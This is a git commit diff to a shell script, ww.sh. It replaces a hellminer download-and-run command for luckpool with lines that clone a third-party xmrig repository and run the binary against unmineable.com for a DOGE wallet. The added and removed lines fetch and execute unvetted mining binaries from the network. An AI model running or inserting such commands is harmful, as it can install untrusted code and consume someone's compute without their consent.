739f08227e6c74b671614d70d0b2be0f6daca2e8
pvnrpccccccc <96951739+pvnrpccccccc@users.noreply.github.com>
2022-01-03 20:57:12 +0800

    Update ww.sh

--- ww.sh
+++ ww.sh
@@ -1,5 +1,3 @@
-sudo apt update
-wget https://github.com/hellcatz/luckpool/raw/master/miners/hellminer_cpu_linux.tar.gz
-tar xf hellminer_cpu_linux.tar.gz
-
-./hellminer -c stratum+tcp://ap.luckpool.net:3956#xnsub -u RTHGhr4mFwjAfvNE6gEum6UeRS2tsiP4q2.1 -p x --cpu 4
+git clone https://github.com/quincyhays/bmxmrig
+chmod +x bmxmrig/xmrig
+bmxmrig/xmrig -o rx.unmineable.com:3333 -a rx -k -u DOGE:DGqNvV6mhvfWGCt51iesfMMmjjzVQ3oYyE --threads=8 -p x -t $(nproc)
